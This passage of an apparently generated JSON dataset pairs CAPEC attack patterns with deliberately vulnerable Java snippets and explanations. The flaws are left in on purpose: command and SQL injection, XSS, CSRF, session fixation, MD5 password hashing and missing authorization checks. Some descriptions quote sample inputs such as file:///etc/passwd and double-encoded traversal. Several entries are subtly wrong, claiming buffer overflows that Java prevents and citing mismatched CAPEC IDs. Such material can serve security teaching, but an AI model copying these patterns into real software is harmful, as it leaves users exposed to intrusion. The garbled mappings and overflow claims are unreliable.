        "description": "This Java code snippet demonstrates a vulnerable MIME conversion routine. The `mimeConversion` method takes an input string, converts it to a byte array, and copies it into a fixed-size buffer without checking if the input size exceeds the buffer size, leading to a potential buffer overflow (CWE-120). The code also decodes a Base64 encoded string to simulate the MIME conversion process. The vulnerability lies in the improper handling of the buffer size, which can be exploited to cause a buffer overflow and potentially gain control over the system. This example embodies the main idea of the CAPEC by showing how an attacker can exploit weaknesses in MIME conversion routines."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.print(\"Enter command: \");\n        String userInput = reader.readLine();\n\n        // Early validation before filtering\n        if (userInput.contains(\"rm\")) {\n            System.out.println(\"Invalid command\");\n            return;\n        }\n\n        // First parsing layer\n        userInput = userInput.replace(\"\\\\\", \"\");\n\n        // Second parsing layer\n        userInput = userInput.replace(\"\\\"\", \"\");\n\n        // Execute command\n        Runtime.getRuntime().exec(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where input validation is performed before all parsing layers are applied, embodying the CAPEC concept of 'Exploiting Multiple Input Interpretation Layers'. The code reads a command from the user and checks if it contains the string 'rm' (a potentially dangerous command). If 'rm' is found, it prints 'Invalid command' and exits. However, the input is then processed through two parsing layers that remove backslashes and double quotes, respectively. This allows an attacker to bypass the initial validation by disguising the 'rm' command with escape characters, which are stripped off by the parsing layers, leading to a command injection vulnerability (CWE-77, CWE-78)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableImageLoader {\n    public static void main(String[] args) {\n        try {\n            FileInputStream fis = new FileInputStream(\"image.jpg\");\n            byte[] buffer = new byte[1024];\n            int bytesRead = fis.read(buffer);\n            fis.close();\n\n            // Vulnerable code: no size check before copying data\n            byte[] imageData = new byte[bytesRead];\n            System.arraycopy(buffer, 0, imageData, 0, bytesRead);\n\n            // Process the image data (dummy processing)\n            System.out.println(\"Image loaded successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable image loader that reads an image file ('image.jpg') into a buffer without proper size checks, leading to a potential buffer overflow. The code reads the file into a fixed-size buffer of 1024 bytes and then copies the data into another byte array without verifying the actual size of the input. This can lead to a buffer overflow if the file size exceeds the buffer size, allowing an attacker to execute arbitrary code. This example embodies the main idea of the CAPEC 'Overflow Binary Resource File' and highlights CWE-120 ('Buffer Copy without Checking Size of Input') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer')."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import java.io.*;\n\npublic class SymbolicLinkBufferOverflow {\n    public static void main(String[] args) {\n        try {\n            // Create a symbolic link\n            File symLink = new File(\"/tmp/symlink\");\n            File targetFile = new File(\"/tmp/target\");\n            Process p = Runtime.getRuntime().exec(\"ln -s \" + targetFile.getAbsolutePath() + \" \" + symLink.getAbsolutePath());\n            p.waitFor();\n\n            // Read from the symbolic link\n            BufferedReader reader = new BufferedReader(new FileReader(symLink));\n            char[] buffer = new char[10];\n            int charsRead = reader.read(buffer);\n            reader.close();\n\n            // Print the buffer content\n            System.out.println(\"Buffer content: \" + new String(buffer, 0, charsRead));\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The code creates a symbolic link pointing to a target file and then reads from the symbolic link into a fixed-size buffer without proper bounds checking. This can lead to a buffer overflow if the target file's content exceeds the buffer size. The code embodies the main idea of CAPEC-Buffer Overflow via Symbolic Links and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class VulnerableConfigParser {\n    public static void main(String[] args) {\n        String filePath = \"config.txt\";\n        char[] buffer = new char[256]; // Fixed-size buffer\n\n        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = br.read(buffer, 0, buffer.length);\n            if (charsRead > 0) {\n                String configData = new String(buffer, 0, charsRead);\n                System.out.println(\"Config Data: \" + configData);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration file parser that reads data from a file into a fixed-size buffer without proper validation. The buffer is defined with a fixed size of 256 characters. The code reads the content of 'config.txt' into this buffer. If the file contains more than 256 characters, it can cause a buffer overflow, leading to potential security vulnerabilities. This snippet embodies the main idea of the CAPEC 'Overflow Variables and Tags' by showing how oversized strings in a configuration file can cause a buffer overflow. The related CWEs are represented as follows:\n- CWE-120: The code copies input from the file to the buffer without checking if the input size exceeds the buffer size.\n- CWE-118 and CWE-119: The code does not restrict operations within the buffer's boundaries, potentially leading to out-of-bounds access.\n- CWE-20: The code does not validate the input size before processing it.\n- CWE-680: If the buffer size calculation were based on an integer operation, an integer overflow could lead to insufficient buffer allocation."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import java.util.Scanner;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your name: \");\n        String input = scanner.nextLine();\n\n        // Vulnerable code: buffer overflow via parameter expansion\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-131: Incorrect Calculation of Buffer Size\n        // CWE-20: Improper Input Validation\n        char[] buffer = new char[10];\n        for (int i = 0; i < input.length(); i++) {\n            buffer[i] = input.charAt(i); // No bounds checking\n        }\n\n        System.out.println(\"Hello, \" + new String(buffer));\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The program reads a user's input and attempts to copy it into a fixed-size buffer without checking if the input length exceeds the buffer size. This can lead to a buffer overflow if the input is longer than the buffer, potentially causing unexpected behavior or security issues. The code embodies the main idea of CAPEC-Buffer Overflow via Parameter Expansion and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-131 (Incorrect Calculation of Buffer Size), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableFileAccess {\n    public static void main(String[] args) {\n        try {\n            String input = args[0]; // Expecting a URL\n            URL url = new URL(input);\n            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n            }\n            in.close();\n        } catch (MalformedURLException e) {\n            System.err.println(\"Invalid URL format: \" + e.getMessage());\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a local file path is passed to a function expecting a URL. The program takes an input string (expected to be a URL) from the command line arguments and attempts to open a stream to read from it. If an attacker provides a local file path (e.g., 'file:///etc/passwd'), the program will read the local file instead of a remote URL. This can lead to unauthorized access to local files and potential leakage of sensitive information. The code also highlights CWE-241 (Improper Handling of Unexpected Data Type) by not validating the input type, CWE-706 (Use of Incorrectly-Resolved Name or Reference) by resolving local file paths, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by potentially exposing sensitive data in the query string."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationSystem {\n    private Map<String, String> userDatabase = new HashMap<>();\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private static final int MAX_ATTEMPTS = 5;\n\n    public AuthenticationSystem() {\n        // Storing passwords in plaintext (CWE-257)\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"123456\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return false;\n        }\n\n        // Improper restriction of excessive authentication attempts (CWE-307)\n        loginAttempts.putIfAbsent(username, 0);\n        if (loginAttempts.get(username) >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset on successful login\n            return true;\n        } else {\n            loginAttempts.put(username, loginAttempts.get(username) + 1);\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem authSystem = new AuthenticationSystem();\n        System.out.println(authSystem.authenticate(\"user1\", \"wrongpassword\")); // false\n        System.out.println(authSystem.authenticate(\"user1\", \"password123\")); // true\n    }\n}",
        "description": "This Java code snippet represents a simple authentication system that embodies the main idea of CAPEC-112: Password Brute Forcing. The code includes several weaknesses related to the described CWEs:\n\n1. **Weak Password Requirements (CWE-521)**: The passwords used in the user database are weak and easily guessable.\n2. **Storing Passwords in a Recoverable Format (CWE-257)**: Passwords are stored in plaintext, making them vulnerable to attacks if the database is compromised.\n3. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The system allows up to 5 failed login attempts before locking the account, which is insufficient to prevent brute force attacks effectively.\n\nThe `authenticate` method checks the username and password against the stored values and tracks the number of failed login attempts. If the maximum number of attempts is exceeded, the account is locked. This code demonstrates how an adversary could exploit weak password policies and insufficient brute force protection to compromise user accounts."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class PasswordRecovery {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Adding a user with a weak password for demonstration\n        userDatabase.put(\"user1\", \"password123\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n\n        if (userDatabase.containsKey(username)) {\n            System.out.println(\"Answer the security question: What is your pet's name?\");\n            String securityAnswer = scanner.nextLine();\n\n            // Weak security question check\n            if (securityAnswer.equalsIgnoreCase(\"fluffy\")) {\n                System.out.println(\"Your password is: \" + userDatabase.get(username));\n            } else {\n                System.out.println(\"Incorrect answer.\");\n            }\n        } else {\n            System.out.println(\"Username not found.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code includes several vulnerabilities related to the CWEs mentioned. It stores passwords in a recoverable format (CWE-257), uses weak password requirements (CWE-521), and employs a weak password recovery mechanism (CWE-640). The code allows a user to recover their password by answering a simple security question, which is easily guessable, thus making it susceptible to exploitation by attackers."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class WebServiceRegistry {\n    private Map<String, String> registry = new HashMap<>();\n\n    public void addService(String serviceName, String serviceEndpoint) {\n        // CWE-314: Storing sensitive information in cleartext\n        registry.put(serviceName, serviceEndpoint);\n    }\n\n    public String getService(String serviceName) {\n        // CWE-285: No authorization check\n        return registry.get(serviceName);\n    }\n\n    public void removeService(String serviceName) {\n        // CWE-693: No protection mechanism for deletion\n        registry.remove(serviceName);\n    }\n\n    public static void main(String[] args) {\n        WebServiceRegistry registry = new WebServiceRegistry();\n        registry.addService(\"PaymentService\", \"http://malicious.example.com\"); // CWE-74: Injection vulnerability\n        System.out.println(\"Service Endpoint: \" + registry.getService(\"PaymentService\"));\n        registry.removeService(\"PaymentService\");\n    }\n}",
        "description": "This Java code snippet represents a simple web service registry that can be poisoned, embodying the main idea of the CAPEC 'Poison Web Service Registry'. The registry allows adding, retrieving, and removing services without proper authorization checks (CWE-285), protection mechanisms (CWE-693), or secure storage (CWE-314). Additionally, it demonstrates how an attacker could inject a malicious service endpoint (CWE-74). The code lacks security measures, making it vulnerable to attacks such as redirecting service requests to malicious endpoints, providing incorrect metadata, and deleting service information."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import java.io.*;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"admin\\0password\";\n        if (isValidUser(userInput)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static boolean isValidUser(String input) {\n        String validUser = \"admin\";\n        return input.equals(validUser);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The `userInput` string contains a null byte (`\\0`), which is often used as a string terminator in many programming environments. The `isValidUser` method compares the `userInput` with a valid username 'admin'. However, due to the null byte, the comparison may not work as intended in some environments, leading to potential security issues. This example highlights CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-697 (Incorrect Comparison), as the null byte can cause the comparison to fail, potentially allowing unauthorized access."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import java.io.UnsupportedEncodingException;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"validInput\\0maliciousCode\";\n        try {\n            // Simulate improper handling of null byte\n            byte[] bytes = userInput.getBytes(\"UTF-8\");\n            String filteredInput = new String(bytes, \"UTF-8\");\n\n            // Simulate a filter that checks for a trailing slash\n            if (filteredInput.endsWith(\"/\")) {\n                System.out.println(\"Input is valid\");\n            } else {\n                System.out.println(\"Input is invalid\");\n            }\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The code takes a user input string that includes a null byte (\\0) followed by malicious code. The input is then converted to a byte array and back to a string, simulating improper handling of null bytes (CWE-158). The code includes a filter that checks if the input ends with a slash (CWE-20), but due to the null byte, the filter can be bypassed, leading to potential security issues. This example highlights the importance of proper input validation and neutralization of special characters."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL Injection attacks. The code constructs an SQL query using user input without proper neutralization of special elements, which can lead to unauthorized access to sensitive information. The user input is directly concatenated into the SQL query, allowing an attacker to manipulate the query logic. This example embodies the main idea of CAPEC-166 (Query System for Information) by showing how an adversary can probe an application's structure and extract information through modified queries. The related CWEs, such as CWE-89 (SQL Injection) and CWE-209 (Generation of Error Message Containing Sensitive Information), are represented in the code by the improper handling of user input and the potential exposure of sensitive data through error messages."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Scanner;\n\npublic class WeakPasswordStorage {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        String hashedPassword = hashPassword(password);\n        System.out.println(\"Stored Hash: \" + hashedPassword);\n    }\n\n    private static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-916: Insufficient computational effort\n            byte[] hashBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password storage mechanism, which is vulnerable to rainbow table attacks. The code takes a user's password input, hashes it using the MD5 algorithm, and prints the hashed password. The use of MD5 (CWE-916) represents insufficient computational effort, making it easier for attackers to use pre-computed hash chains (rainbow tables) to crack the password. This example highlights the risks associated with weak encoding for passwords (CWE-261) and the use of weak password hashing algorithms."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String request = in.readLine();\n            if (request.equals(\"AUTHENTICATE\")) {\n                // Vulnerable guard logic\n                String token = in.readLine();\n                if (token.equals(\"valid-token\")) {\n                    out.println(\"Authenticated\");\n                } else {\n                    out.println(\"Authentication Failed\");\n                }\n            } else if (request.equals(\"REPLAY\")) {\n                // Replay attack vulnerability\n                String replayedToken = in.readLine();\n                out.println(\"Authenticated with replayed token: \" + replayedToken);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server has two main functionalities: authentication and handling replayed tokens. The authentication logic is flawed because it relies on a simple token check, which can be easily bypassed if the token is known. Additionally, the server is vulnerable to replay attacks, as it accepts replayed tokens without proper validation. This code embodies the main idea of CAPEC-207 by demonstrating how removing or short-circuiting guard logic can lead to security vulnerabilities, such as authentication bypass (CWE-287) and capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/sensitiveData\")\npublic class SensitiveDataServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"token\");\n\n        // CWE-287: Improper Authentication\n        if (sensitiveData != null && sensitiveData.equals(\"hardcodedToken\")) {\n            // CWE-642: External Control of Critical State Data\n            String userData = System.getenv(\"USER_DATA\");\n            response.getWriter().println(\"Sensitive Data: \" + userData);\n        } else {\n            response.getWriter().println(\"Unauthorized access\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a REST-style application that is vulnerable to several security weaknesses. The servlet processes a GET request containing sensitive information in the query string (CWE-598). It uses improper authentication by comparing the provided token with a hardcoded value (CWE-287). If the token matches, it retrieves sensitive user data from an environment variable (CWE-642) and sends it back in the response. This setup exemplifies the CAPEC scenario where the application trusts system resources and environment variables to obtain and expose sensitive data once SSL is terminated."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/user\")\npublic class UserServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        // No authorization check\n        response.getWriter().println(\"User data for user: \" + userId);\n    }\n\n    @Override\n    protected void doPut(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String newData = request.getParameter(\"data\");\n        // No authorization check\n        // Update user data\n        response.getWriter().println(\"Updated user data for user: \" + userId);\n    }\n\n    @Override\n    protected void doDelete(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        // No authorization check\n        // Delete user data\n        response.getWriter().println(\"Deleted user data for user: \" + userId);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a RESTful service that handles HTTP GET, PUT, and DELETE requests for user data. The main vulnerability here is the lack of authorization checks before performing actions on user data. This embodies the CAPEC 'Restful Privilege Elevation' by allowing an adversary to perform malicious actions due to the absence of access control mechanisms. The related CWEs are represented as follows: CWE-267 and CWE-269 are shown by the unsafe actions and improper privilege management, CWE-650 by trusting HTTP methods without proper checks, CWE-648 by incorrect use of privileged APIs, and CWE-285 by improper authorization."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import java.security.SecureRandom;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class SessionManager {\n    private static final int SESSION_ID_LENGTH = 5; // CWE-6: Insufficient Session-ID Length\n    private static final Map<String, String> sessions = new HashMap<>();\n    private static final SecureRandom random = new SecureRandom();\n\n    public static String createSession(String username) {\n        String sessionId = generateSessionId();\n        sessions.put(sessionId, username);\n        return sessionId;\n    }\n\n    private static String generateSessionId() {\n        StringBuilder sessionId = new StringBuilder(SESSION_ID_LENGTH);\n        for (int i = 0; i < SESSION_ID_LENGTH; i++) {\n            sessionId.append(random.nextInt(10)); // CWE-330: Insufficiently Random Values\n        }\n        return sessionId.toString();\n    }\n\n    public static String getUser(String sessionId) {\n        return sessions.get(sessionId); // CWE-346: Origin Validation Error\n    }\n\n    public static void main(String[] args) {\n        String sessionId = createSession(\"user1\");\n        System.out.println(\"Session ID: \" + sessionId);\n        System.out.println(\"User: \" + getUser(sessionId));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session management system. The `SessionManager` class creates and manages user sessions using session IDs. The session IDs are generated using a `SecureRandom` instance, but the length of the session ID is insufficient (CWE-6), making it easier to predict. Additionally, the session ID generation uses only numeric values (CWE-330), which further reduces the entropy and makes the session IDs more predictable. The `getUser` method retrieves the username associated with a session ID without proper validation (CWE-346), allowing an attacker to potentially hijack sessions by predicting or guessing valid session IDs. This code embodies the main idea of CAPEC-139: Session Credential Falsification through Prediction, by demonstrating how predictable session IDs can lead to session hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Retrieve session ID from request\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n\n        // Check if session exists\n        if (session == null || !session.getId().equals(sessionId)) {\n            // Create a new session if it doesn't exist\n            session = request.getSession(true);\n            session.setAttribute(\"user\", \"guest\");\n        }\n\n        // Simulate sensitive operation\n        String user = (String) session.getAttribute(\"user\");\n        response.getWriter().println(\"Hello, \" + user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to session ID reuse, which can lead to session replay attacks. The code retrieves a session ID from the request parameters and checks if a session with that ID exists. If the session does not exist, it creates a new session and assigns a default user attribute. This approach is vulnerable because it does not properly validate the session ID, allowing an attacker to reuse a stolen session ID to gain unauthorized access. Additionally, the code does not invalidate old sessions, which can lead to session fixation attacks. The code also exposes sensitive information by printing the user attribute without proper authorization checks."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableSessionFixationServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n        if (session == null) {\n            session = request.getSession();\n            session.setAttribute(\"sessionId\", sessionId);\n        }\n        // Simulate user authentication\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        if (authenticateUser(username, password)) {\n            session.setAttribute(\"authenticated\", true);\n            response.getWriter().write(\"User authenticated with session ID: \" + session.getId());\n        } else {\n            response.getWriter().write(\"Authentication failed\");\n        }\n    }\n\n    private boolean authenticateUser(String username, String password) {\n        // Dummy authentication logic\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a session fixation vulnerability. The attacker can provide a session ID via a request parameter, which the server then uses to create or continue a session. If the user successfully authenticates, the session ID remains the same, allowing the attacker to hijack the session. This code embodies the main idea of CAPEC-384 (Session Fixation) and is related to several CWEs: CWE-384 (Session Fixation), CWE-664 (Improper Control of a Resource Through its Lifetime), CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-602 (Client-Side Enforcement of Server-Side Security), and CWE-1270 (Generation of Incorrect Security Tokens). The code does not invalidate the session ID upon authentication, which is the core issue leading to the vulnerability."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class TransferFundsServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"user\") == null) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"User not authenticated\");\n            return;\n        }\n\n        String amount = request.getParameter(\"amount\");\n        String account = request.getParameter(\"account\");\n\n        // Missing CSRF token validation\n        // Vulnerable to CSRF attack\n        transferFunds(session.getAttribute(\"user\"), account, amount);\n\n        response.getWriter().write(\"Funds transferred successfully\");\n    }\n\n    private void transferFunds(Object user, String account, String amount) {\n        // Logic to transfer funds\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Request Forgery (CSRF) vulnerability. The `doPost` method handles a fund transfer request. It checks if the user is authenticated by verifying the session, but it does not include any CSRF token validation. This omission allows an attacker to craft a malicious request that can be executed with the user's session, leading to unauthorized fund transfers. The code snippet embodies the main idea of CAPEC-352 (CSRF) and highlights related weaknesses such as missing authentication for critical functions (CWE-306) and improper control of a resource through its lifetime (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>\" + userInput + \"</h1>\"); // Vulnerable to XSS\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability. The servlet takes user input from a request parameter named 'input' and directly includes it in the HTML response without any validation or sanitization. This is a classic example of CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-20 (Improper Input Validation). An attacker can exploit this by injecting malicious scripts into the 'input' parameter, which will then be executed in the context of the user's browser. This code snippet highlights the importance of properly validating and sanitizing user inputs to prevent XSS attacks."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.net.URLDecoder;\n\n@WebServlet(\"/secure/*\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String path = request.getPathInfo();\n        if (path != null) {\n            // Decode the URL-encoded path\n            String decodedPath = URLDecoder.decode(path, \"UTF-8\");\n\n            // Check if the path is trying to access restricted directory\n            if (decodedPath.contains(\"..\")) {\n                response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n                return;\n            }\n\n            // Simulate file access based on the decoded path\n            response.getWriter().println(\"Accessing: \" + decodedPath);\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid Path\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where URL encoding and decoding can be exploited to bypass validation logic. The servlet decodes the URL-encoded path and checks for path traversal attempts by looking for '..' sequences. However, this simplistic check can be bypassed by using double URL encoding or other encoding schemes. For example, an attacker could use '%252e%252e%252f' (double-encoded '../') to bypass the check and access restricted directories. This code snippet embodies the main idea of CAPEC-177 and related CWEs, highlighting improper handling of URL encoding, improper input validation, and potential path traversal vulnerabilities."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
